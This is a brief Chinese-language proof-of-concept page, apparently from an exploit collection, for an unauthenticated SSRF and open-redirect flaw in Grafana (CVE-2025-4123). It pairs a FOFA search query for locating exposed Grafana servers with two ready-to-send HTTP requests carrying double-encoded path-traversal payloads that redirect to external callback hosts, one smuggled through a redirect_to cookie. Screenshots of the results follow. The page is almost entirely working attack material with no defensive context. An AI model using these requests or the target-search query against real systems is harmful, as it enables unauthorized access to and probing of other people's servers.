# Grafana存在未授权SSRF漏洞(CVE-2025-4123)

# fofa
```
app="Grafana"
```

## poc

```javascript
GET /render/public/..%252f%255Cczeqm5.dnslog.cn%252f%253F%252f..%252f.. HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Fedora; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0
Connection: close
Accept-Encoding: gzip
```
<img width="886" alt="1749624834319" src="https://github.com/user-attachments/assets/e139dab4-6d61-4f29-aff2-a8f84d29cd6c" />

```
GET /public/..%2F%5c123.czeqm5.dnslog.cn%2F%3f%2F..%2F.. HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12) AppleWebKit/616.19 (KHTML, like Gecko) Version/17.7.17 Safari/616.19
Connection: close
Cookie: redirect_to=%2Frender%2Fpublic%2F..%25252f%25255Cd0nt31pu8bl7cn5ncca08sg68smps8h39.oast.live%25252f%25253F%25252f..%25252f..
Accept-Encoding: gzip
```
<img width="847" alt="1749624867787" src="https://github.com/user-attachments/assets/e41c2152-38a2-49ca-a21b-f99a23a4a567" />

跟随重定向后 重定向数据

<img width="948" alt="1749624883551" src="https://github.com/user-attachments/assets/fb55bccf-853f-4773-810b-3c91580089a8" />

ssrf

<img width="878" alt="1749624901460" src="https://github.com/user-attachments/assets/82c6ee4a-4165-4245-9f23-8129af9b6ed3" />
